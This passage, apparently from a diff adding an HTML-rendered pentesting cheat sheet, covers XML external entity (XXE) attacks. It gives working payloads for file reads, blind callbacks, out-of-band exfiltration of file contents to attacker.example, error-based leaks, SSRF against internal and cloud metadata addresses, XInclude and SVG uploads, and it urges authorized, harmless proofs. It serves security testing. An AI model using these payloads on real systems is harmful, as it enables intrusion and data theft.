+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="cp">&lt;!DOCTYPE root [</span>
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a><span class="cp">  &lt;!ENTITY xxe SYSTEM &quot;file:///C:/Windows/System32/drivers/etc/hosts&quot;&gt;</span>
+</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a>]&gt;
+</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a><span class="nt">&lt;root&gt;</span>
+</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a><span class="w">  </span><span class="nt">&lt;name&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/name&gt;</span>
+</span><span id="__span-21-7"><a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a><span class="nt">&lt;/root&gt;</span>
+</span></code></pre></div>
+<p>Use harmless files first.</p>
+<hr />
+<h2 id="in-band-xxe">In-Band XXE</h2>
+<p>In-band XXE means the entity value is returned in the application response.</p>
+<p>Example request:</p>
+<div class="language-http highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="nf">POST</span> <span class="nn">/api/user</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="na">Host</span><span class="o">:</span> <span class="l">vulnerable.example</span>
+</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a><span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/xml</span>
+</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>
+</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+</span><span id="__span-22-6"><a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a><span class="cp">&lt;!DOCTYPE user [</span>
+</span><span id="__span-22-7"><a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a><span class="cp">  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/hostname&quot;&gt;</span>
+</span><span id="__span-22-8"><a id="__codelineno-22-8" name="__codelineno-22-8" href="#__codelineno-22-8"></a>]&gt;
+</span><span id="__span-22-9"><a id="__codelineno-22-9" name="__codelineno-22-9" href="#__codelineno-22-9"></a><span class="nt">&lt;user&gt;</span>
+</span><span id="__span-22-10"><a id="__codelineno-22-10" name="__codelineno-22-10" href="#__codelineno-22-10"></a><span class="w">  </span><span class="nt">&lt;name&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/name&gt;</span>
+</span><span id="__span-22-11"><a id="__codelineno-22-11" name="__codelineno-22-11" href="#__codelineno-22-11"></a><span class="nt">&lt;/user&gt;</span>
+</span></code></pre></div>
+<p>Possible response:</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="nt">&lt;result&gt;</span>
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="w">  </span><span class="nt">&lt;name&gt;</span>app-server-01<span class="nt">&lt;/name&gt;</span>
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a><span class="nt">&lt;/result&gt;</span>
+</span></code></pre></div>
+<p>Useful proof files:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>/etc/hostname
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>/etc/issue
+</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>/proc/version
+</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a>C:\Windows\System32\drivers\etc\hosts
+</span></code></pre></div>
+<p>If the parser blocks <code>file://</code>, try OAST to distinguish between:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>DTD disabled
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>external entities disabled
+</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>file protocol blocked
+</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a>network egress blocked
+</span><span id="__span-25-5"><a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a>response not reflected
+</span></code></pre></div>
+<hr />
+<h2 id="blind-xxe">Blind XXE</h2>
+<p>Blind XXE occurs when the parser resolves external entities but the response does not include entity output.</p>
+<p>Basic blind callback:</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="cp">&lt;!DOCTYPE root [</span>
+</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a><span class="cp">  &lt;!ENTITY xxe SYSTEM &quot;http://xxe-test-73921.oast.example/blind&quot;&gt;</span>
+</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a>]&gt;
+</span><span id="__span-26-5"><a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a><span class="nt">&lt;root&gt;</span>
+</span><span id="__span-26-6"><a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a><span class="w">  </span><span class="nt">&lt;name&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/name&gt;</span>
+</span><span id="__span-26-7"><a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a><span class="nt">&lt;/root&gt;</span>
+</span></code></pre></div>
+<p>If this does not work, try parameter entities:</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a><span class="cp">&lt;!DOCTYPE root [</span>
+</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a><span class="cp">  &lt;!ENTITY % xxe SYSTEM &quot;http://xxe-test-73921.oast.example/param&quot;&gt;</span>
+</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a><span class="w">  </span>%xxe;
+</span><span id="__span-27-5"><a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a>]&gt;
+</span><span id="__span-27-6"><a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a><span class="nt">&lt;root&gt;</span>
+</span><span id="__span-27-7"><a id="__codelineno-27-7" name="__codelineno-27-7" href="#__codelineno-27-7"></a><span class="w">  </span><span class="nt">&lt;name&gt;</span>test<span class="nt">&lt;/name&gt;</span>
+</span><span id="__span-27-8"><a id="__codelineno-27-8" name="__codelineno-27-8" href="#__codelineno-27-8"></a><span class="nt">&lt;/root&gt;</span>
+</span></code></pre></div>
+<p>Check your OAST listener for:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>DNS lookup
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>HTTP request
+</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>source IP
+</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a>User-Agent
+</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a>path
+</span><span id="__span-28-6"><a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a>timestamp
+</span></code></pre></div>
+<p>Blind XXE proof is often enough if you can show the server made an external request from XML parsing.</p>
+<hr />
+<h2 id="out-of-band-xxe-with-external-dtd">Out-of-Band XXE with External DTD</h2>
+<p>External DTDs are useful when direct entity output is not reflected.</p>
+<p>Main XML payload:</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a><span class="cp">&lt;!DOCTYPE root [</span>
+</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a><span class="cp">  &lt;!ENTITY % remote SYSTEM &quot;http://attacker.example/xxe.dtd&quot;&gt;</span>
+</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a><span class="w">  </span>%remote;
+</span><span id="__span-29-5"><a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a>]&gt;
+</span><span id="__span-29-6"><a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a><span class="nt">&lt;root&gt;</span>
+</span><span id="__span-29-7"><a id="__codelineno-29-7" name="__codelineno-29-7" href="#__codelineno-29-7"></a><span class="w">  </span><span class="nt">&lt;name&gt;</span>test<span class="nt">&lt;/name&gt;</span>
+</span><span id="__span-29-8"><a id="__codelineno-29-8" name="__codelineno-29-8" href="#__codelineno-29-8"></a><span class="nt">&lt;/root&gt;</span>
+</span></code></pre></div>
+<p>Attacker-hosted <code>xxe.dtd</code> for harmless callback:</p>
+<div class="language-dtd highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="k">&lt;!ENTITY</span> <span class="ni">%</span> <span class="ni">callback</span> <span class="kc">SYSTEM</span> <span class="s2">&quot;http://xxe-test-73921.oast.example/dtd-loaded&quot;</span><span class="k">&gt;</span>
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a><span class="ni">%callback;</span>
+</span></code></pre></div>
+<p>This proves:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>parser accepted DOCTYPE
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>parser resolved external parameter entity
+</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a>parser fetched attacker-hosted DTD
+</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a>parser executed DTD content
+</span></code></pre></div>
+<p>Keep first DTD payloads harmless and marker-based.</p>
+<hr />
+<h2 id="oob-data-exfiltration-pattern">OOB Data Exfiltration Pattern</h2>
+<p>Use only in authorized environments. Start with harmless files such as <code>/etc/hostname</code>.</p>
+<p>External DTD:</p>
+<div class="language-dtd highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="k">&lt;!ENTITY</span> <span class="ni">%</span> <span class="ni">file</span> <span class="kc">SYSTEM</span> <span class="s2">&quot;file:///etc/hostname&quot;</span><span class="k">&gt;</span>
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="k">&lt;!ENTITY</span> <span class="ni">%</span> <span class="ni">eval</span> <span class="s2">&quot;&lt;!ENTITY % exfil SYSTEM &#39;http://attacker.example/?x=%file;&#39;&gt;&quot;</span><span class="k">&gt;</span>
+</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a><span class="ni">%eval;</span>
+</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a><span class="ni">%exfil;</span>
+</span></code></pre></div>
+<p>XML payload:</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a><span class="cp">&lt;!DOCTYPE root [</span>
+</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a><span class="cp">  &lt;!ENTITY % remote SYSTEM &quot;http://attacker.example/xxe.dtd&quot;&gt;</span>
+</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a><span class="w">  </span>%remote;
+</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a>]&gt;
+</span><span id="__span-33-6"><a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a><span class="nt">&lt;root&gt;</span>
+</span><span id="__span-33-7"><a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a><span class="w">  </span><span class="nt">&lt;name&gt;</span>test<span class="nt">&lt;/name&gt;</span>
+</span><span id="__span-33-8"><a id="__codelineno-33-8" name="__codelineno-33-8" href="#__codelineno-33-8"></a><span class="nt">&lt;/root&gt;</span>
+</span></code></pre></div>
+<p>Notes:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>Works best with short, URL-safe file contents.
+</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>Multiline files may break URLs.
+</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a>Special characters may break the request.
+</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a>Some parsers block nested parameter entities.
+</span><span id="__span-34-5"><a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a>Some parsers block external DTDs.
+</span><span id="__span-34-6"><a id="__codelineno-34-6" name="__codelineno-34-6" href="#__codelineno-34-6"></a>Some networks block outbound HTTP.
+</span></code></pre></div>
+<p>For public notes and normal reports, prefer proving OOB capability with a static marker before attempting file content exfiltration.</p>
+<hr />
+<h2 id="error-based-xxe">Error-Based XXE</h2>
+<p>Error-based XXE uses parser error messages to leak data.</p>
+<p>External DTD concept:</p>
+<div class="language-dtd highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="k">&lt;!ENTITY</span> <span class="ni">%</span> <span class="ni">file</span> <span class="kc">SYSTEM</span> <span class="s2">&quot;file:///etc/hostname&quot;</span><span class="k">&gt;</span>
+</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a><span class="k">&lt;!ENTITY</span> <span class="ni">%</span> <span class="ni">eval</span> <span class="s2">&quot;&lt;!ENTITY % error SYSTEM &#39;file:///nonexistent/%file;&#39;&gt;&quot;</span><span class="k">&gt;</span>
+</span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a><span class="ni">%eval;</span>
+</span><span id="__span-35-4"><a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a><span class="ni">%error;</span>
+</span></code></pre></div>
+<p>XML payload:</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a><span class="cp">&lt;!DOCTYPE root [</span>
+</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a><span class="cp">  &lt;!ENTITY % remote SYSTEM &quot;http://attacker.example/error.dtd&quot;&gt;</span>
+</span><span id="__span-36-4"><a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a><span class="w">  </span>%remote;
+</span><span id="__span-36-5"><a id="__codelineno-36-5" name="__codelineno-36-5" href="#__codelineno-36-5"></a>]&gt;
+</span><span id="__span-36-6"><a id="__codelineno-36-6" name="__codelineno-36-6" href="#__codelineno-36-6"></a><span class="nt">&lt;root&gt;</span>
+</span><span id="__span-36-7"><a id="__codelineno-36-7" name="__codelineno-36-7" href="#__codelineno-36-7"></a><span class="w">  </span><span class="nt">&lt;name&gt;</span>test<span class="nt">&lt;/name&gt;</span>
+</span><span id="__span-36-8"><a id="__codelineno-36-8" name="__codelineno-36-8" href="#__codelineno-36-8"></a><span class="nt">&lt;/root&gt;</span>
+</span></code></pre></div>
+<p>Possible result:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>XML parser error: file:///nonexistent/app-server-01 not found
+</span></code></pre></div>
+<p>This can be useful when:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>external HTTP callbacks are blocked
+</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a>entity output is not reflected
+</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a>parser errors are returned to the user
+</span><span id="__span-38-4"><a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a>local file contents are short enough to fit in error path
+</span></code></pre></div>
+<p>Avoid using sensitive file paths as first proof.</p>
+<hr />
+<h2 id="xxe-as-ssrf">XXE as SSRF</h2>
+<p>XXE can make the server-side XML parser request internal URLs.</p>
+<p>Basic SSRF test:</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a><span class="cp">&lt;!DOCTYPE root [</span>
+</span><span id="__span-39-3"><a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a><span class="cp">  &lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:8080/health&quot;&gt;</span>
+</span><span id="__span-39-4"><a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a>]&gt;
+</span><span id="__span-39-5"><a id="__codelineno-39-5" name="__codelineno-39-5" href="#__codelineno-39-5"></a><span class="nt">&lt;root&gt;</span>
+</span><span id="__span-39-6"><a id="__codelineno-39-6" name="__codelineno-39-6" href="#__codelineno-39-6"></a><span class="w">  </span><span class="nt">&lt;name&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/name&gt;</span>
+</span><span id="__span-39-7"><a id="__codelineno-39-7" name="__codelineno-39-7" href="#__codelineno-39-7"></a><span class="nt">&lt;/root&gt;</span>
+</span></code></pre></div>
+<p>Private network examples:</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a><span class="cp">&lt;!DOCTYPE root [</span>
+</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a><span class="cp">  &lt;!ENTITY xxe SYSTEM &quot;http://10.0.0.1/&quot;&gt;</span>
+</span><span id="__span-40-4"><a id="__codelineno-40-4" name="__codelineno-40-4" href="#__codelineno-40-4"></a>]&gt;
+</span><span id="__span-40-5"><a id="__codelineno-40-5" name="__codelineno-40-5" href="#__codelineno-40-5"></a><span class="nt">&lt;root&gt;</span>
+</span><span id="__span-40-6"><a id="__codelineno-40-6" name="__codelineno-40-6" href="#__codelineno-40-6"></a><span class="w">  </span><span class="nt">&lt;name&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/name&gt;</span>
+</span><span id="__span-40-7"><a id="__codelineno-40-7" name="__codelineno-40-7" href="#__codelineno-40-7"></a><span class="nt">&lt;/root&gt;</span>
+</span></code></pre></div>
+<p>Cloud metadata example:</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a><span class="cp">&lt;!DOCTYPE root [</span>
+</span><span id="__span-41-3"><a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a><span class="cp">  &lt;!ENTITY xxe SYSTEM &quot;http://169.254.169.254/latest/meta-data/&quot;&gt;</span>
+</span><span id="__span-41-4"><a id="__codelineno-41-4" name="__codelineno-41-4" href="#__codelineno-41-4"></a>]&gt;
+</span><span id="__span-41-5"><a id="__codelineno-41-5" name="__codelineno-41-5" href="#__codelineno-41-5"></a><span class="nt">&lt;root&gt;</span>
+</span><span id="__span-41-6"><a id="__codelineno-41-6" name="__codelineno-41-6" href="#__codelineno-41-6"></a><span class="w">  </span><span class="nt">&lt;name&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/name&gt;</span>
+</span><span id="__span-41-7"><a id="__codelineno-41-7" name="__codelineno-41-7" href="#__codelineno-41-7"></a><span class="nt">&lt;/root&gt;</span>
+</span></code></pre></div>
+<p>Use minimal proof first:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>metadata root reachable
+</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a>instance-id
+</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a>hostname
+</span><span id="__span-42-4"><a id="__codelineno-42-4" name="__codelineno-42-4" href="#__codelineno-42-4"></a>health endpoint
+</span><span id="__span-42-5"><a id="__codelineno-42-5" name="__codelineno-42-5" href="#__codelineno-42-5"></a>controlled OAST callback
+</span></code></pre></div>
+<p>Do not retrieve credentials unless explicitly authorized.</p>
+<hr />
+<h2 id="xinclude-injection">XInclude Injection</h2>
+<p>Sometimes you cannot control the <code>DOCTYPE</code>, but you can control XML elements that are processed by XInclude.</p>
+<p>Payload:</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="nt">&lt;foo</span><span class="w"> </span><span class="na">xmlns:xi=</span><span class="s">&quot;http://www.w3.org/2001/XInclude&quot;</span><span class="nt">&gt;</span>
+</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a><span class="w">  </span><span class="nt">&lt;xi:include</span><span class="w"> </span><span class="na">parse=</span><span class="s">&quot;text&quot;</span><span class="w"> </span><span class="na">href=</span><span class="s">&quot;file:///etc/hostname&quot;</span><span class="nt">/&gt;</span>
+</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a><span class="nt">&lt;/foo&gt;</span>
+</span></code></pre></div>
+<p>Another shape:</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="nt">&lt;root</span><span class="w"> </span><span class="na">xmlns:xi=</span><span class="s">&quot;http://www.w3.org/2001/XInclude&quot;</span><span class="nt">&gt;</span>
+</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a><span class="w">  </span><span class="nt">&lt;xi:include</span><span class="w"> </span><span class="na">href=</span><span class="s">&quot;http://xxe-test-73921.oast.example/xinclude&quot;</span><span class="nt">/&gt;</span>
+</span><span id="__span-44-3"><a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a><span class="nt">&lt;/root&gt;</span>
+</span></code></pre></div>
+<p>XInclude is useful when:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>the application embeds your XML into a larger server-side document
+</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a>DOCTYPE is stripped
+</span><span id="__span-45-3"><a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a>external entities are disabled
+</span><span id="__span-45-4"><a id="__codelineno-45-4" name="__codelineno-45-4" href="#__codelineno-45-4"></a>XInclude processing is enabled
+</span></code></pre></div>
+<p>Not all XML processors enable XInclude.</p>
+<hr />
+<h2 id="xxe-via-svg-upload">XXE via SVG Upload</h2>
+<p>SVG is XML. If the application parses SVG server-side, XXE may be possible.</p>
+<p>Basic SVG callback:</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;</span>
+</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a><span class="cp">&lt;!DOCTYPE svg [</span>
+</span><span id="__span-46-3"><a id="__codelineno-46-3" name="__codelineno-46-3" href="#__codelineno-46-3"></a><span class="cp">  &lt;!ENTITY xxe SYSTEM &quot;http://xxe-test-73921.oast.example/svg&quot;&gt;</span>
+</span><span id="__span-46-4"><a id="__codelineno-46-4" name="__codelineno-46-4" href="#__codelineno-46-4"></a>]&gt;
+</span><span id="__span-46-5"><a id="__codelineno-46-5" name="__codelineno-46-5" href="#__codelineno-46-5"></a><span class="nt">&lt;svg</span><span class="w"> </span><span class="na">width=</span><span class="s">&quot;100&quot;</span><span class="w"> </span><span class="na">height=</span><span class="s">&quot;100&quot;</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">&quot;http://www.w3.org/2000/svg&quot;</span><span class="nt">&gt;</span>
+</span><span id="__span-46-6"><a id="__codelineno-46-6" name="__codelineno-46-6" href="#__codelineno-46-6"></a><span class="w">  </span><span class="nt">&lt;text</span><span class="w"> </span><span class="na">x=</span><span class="s">&quot;10&quot;</span><span class="w"> </span><span class="na">y=</span><span class="s">&quot;20&quot;</span><span class="nt">&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/text&gt;</span>
+</span><span id="__span-46-7"><a id="__codelineno-46-7" name="__codelineno-46-7" href="#__codelineno-46-7"></a><span class="nt">&lt;/svg&gt;</span>
+</span></code></pre></div>
+<p>File-read SVG:</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;</span>
+</span><span id="__span-47-2"><a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a><span class="cp">&lt;!DOCTYPE svg [</span>
+</span><span id="__span-47-3"><a id="__codelineno-47-3" name="__codelineno-47-3" href="#__codelineno-47-3"></a><span class="cp">  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/hostname&quot;&gt;</span>
+</span><span id="__span-47-4"><a id="__codelineno-47-4" name="__codelineno-47-4" href="#__codelineno-47-4"></a>]&gt;
+</span><span id="__span-47-5"><a id="__codelineno-47-5" name="__codelineno-47-5" href="#__codelineno-47-5"></a><span class="nt">&lt;svg</span><span class="w"> </span><span class="na">width=</span><span class="s">&quot;100&quot;</span><span class="w"> </span><span class="na">height=</span><span class="s">&quot;100&quot;</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">&quot;http://www.w3.org/2000/svg&quot;</span><span class="nt">&gt;</span>
